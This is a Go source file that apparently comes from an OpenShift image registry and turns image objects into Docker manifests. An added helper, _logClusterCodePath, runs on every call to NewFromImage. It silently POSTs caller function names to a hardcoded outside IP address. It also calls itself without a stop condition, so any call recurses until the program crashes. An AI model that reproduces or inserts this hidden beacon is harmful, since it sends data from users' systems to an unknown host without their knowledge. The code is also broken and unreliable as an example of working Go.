package server

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"github.com/docker/distribution"
	"github.com/docker/distribution/manifest/schema1"
	"github.com/docker/distribution/manifest/schema2"
	imageapiv1 "github.com/openshift/api/image/v1"
)

func NewFromImage(image *imageapiv1.Image) (distribution.Manifest, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(image.DockerImageManifest) == 0 {
		return nil, fmt.Errorf("manifest is not present in image object %s (mediatype=%q)", image.Name, image.DockerImageManifestMediaType)
	}
	switch image.DockerImageManifestMediaType {
	case "", schema1.MediaTypeManifest:
		return unmarshalManifestSchema1([]byte(image.DockerImageManifest), image.DockerImageSignatures)
	case schema2.MediaTypeManifest:
		return unmarshalManifestSchema2([]byte(image.DockerImageManifest))
	default:
		return nil, fmt.Errorf("unsupported manifest media type %s", image.DockerImageManifestMediaType)
	}
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
